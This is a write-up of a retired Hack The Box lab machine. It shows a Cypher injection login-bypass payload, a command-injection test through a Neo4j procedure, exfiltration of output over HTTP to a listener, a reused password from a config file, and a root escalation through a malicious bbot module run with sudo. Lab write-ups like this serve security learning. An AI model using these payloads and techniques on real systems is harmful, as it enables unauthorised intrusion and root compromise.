# Cypher — HTB (Medium, retired)

> Difficulty and retired status confirmed with the operator (Medium, retired):
> publishable. Flags redacted.

## Overview

Cypher is a Linux box whose entire front end is a graph-based "Attack Surface
Management" product backed by Neo4j. The name is the hint: the path is a
**Cypher (Neo4j) injection** in the login, which unlocks a raw query endpoint,
which in turn reaches a custom procedure that shells out — RCE. From there it is
a world-readable password reused for SSH, and a `sudo` rule on `bbot` that loads
attacker-supplied Python as root.

## Recon

Two ports: SSH (OpenSSH 9.6p1, Ubuntu 24.04) and nginx 1.24.0. The root page
302-redirects the bare IP to `cypher.htb`, so everything lives on that vhost.
The site is "GRAPH ASM", a FastAPI app (JSON `detail` errors, 307 redirects,
`www-authenticate: Bearer`) that renders a force-directed graph. Navigation:
`/about`, `/login`, `/demo` (auth-gated), `/data.json`.

## Foothold

### Cypher injection → auth bypass

`POST /api/auth` takes `username`/`password`. A single quote in the username
returns a Neo4j syntax error **with the full query**:

```
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '<username>' return h.value as hash
```

So the backend looks up the user, follows a `:SECRET` relationship to a `:SHA1`
node, and compares `SHA1(password)` to the stored `h.value`. The username is a
single-quoted string literal with no escaping — a textbook injection.

Because the comparison is `SHA1(submitted_password) == returned_hash`, I do not
need anyone's real hash. I make the query return the SHA1 of a password I choose,
via a UNION whose second part is a MATCH-less `RETURN` (so it is not gated by the
MATCH):

```
username = x' RETURN h.value as hash UNION RETURN '<sha1(test)>' as hash //
password = test
```

The response sets a JWT `access-token` cookie. Logged in.

### Raw Cypher endpoint → command injection

The authenticated demo calls `GET /api/cypher?query=…` — it runs arbitrary
Cypher. `SHOW PROCEDURES` lists a custom procedure:

```
custom.getUrlStatusCode(url :: STRING) :: (statusCode :: STRING)
```

It fetches a URL and returns the HTTP status. A benign call returns `302`. The
URL is handed to a shell, so command substitution runs:

```
CALL custom.getUrlStatusCode("http://127.0.0.1$(sleep 5)") …   -> +5 s
```

Egress is open (verified with tcpdump on the VPN interface — the target both
TCP-connects back and answers ICMP). Rather than babysit a reverse shell, the
clean channel here is an in-band one: run the command, base64 its output, and
`curl` it as a path to a listener — the output comes back in a request I asked
for, independent of shell stability.

Exec runs as `neo4j`. `/home/graphasm` belongs to the interactive user; `user.txt`
is `root:graphasm` and unreadable by `neo4j`.

## Lateral movement

`neo4j` can read `/home/graphasm/bbot_preset.yml`:

```yaml
config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

That password is reused as `graphasm`'s **SSH** password. `ssh graphasm@…` →
`user.txt`.

## Privilege escalation

```
graphasm may run: (ALL) NOPASSWD: /usr/local/bin/bbot
```

bbot (v2.1.0) is a modular recon framework. Its presets accept a top-level
`module_dirs:` key: directories to load modules from. Reading the source,
`core/modules.py` *preloads* modules with `ast.parse` (metadata only) but
*loads* an enabled module with `importlib.util.spec_from_file_location` +
`exec_module` — i.e. it imports the file, running its top-level code and
`setup()`. Running bbot under sudo makes that code execute as **root**.

A minimal module placed in a `module_dirs` directory, enabled via `modules:`:

```python
from bbot.modules.base import BaseModule
import os
os.system("…read /root/root.txt; plant SSH key in /root/.ssh/authorized_keys…")
class pwn(BaseModule):
    watched_events = ["DNS_NAME"]; produced_events = ["DNS_NAME"]
    async def setup(self):
        os.system("…"); return True
```

```
sudo /usr/local/bin/bbot -p /tmp/pwn.yml -t cypher.htb -y --no-deps
```

The module imports as root, drops my key into root's `authorized_keys`, and
`ssh -i … root@…` returns a root shell. `root.txt` captured.

## Lessons / methodology notes

- The hostname theme ("Cypher"/graph) pointed at Neo4j, but every step was still
  evidenced: the injection was proven by the reflected query, the RCE by a timing
  oracle, egress by tcpdump.
- A sink that only returns a status code is still a full RCE output channel once
  egress is confirmed — exfil through a request you control beats fighting a
  reverse shell.
- "sudo a recon/automation tool" is a code-exec primitive whenever that tool
  loads modules/config it reads from a path you control (bbot `module_dirs`, the
  same class as Ansible/Terraform plugin dirs).
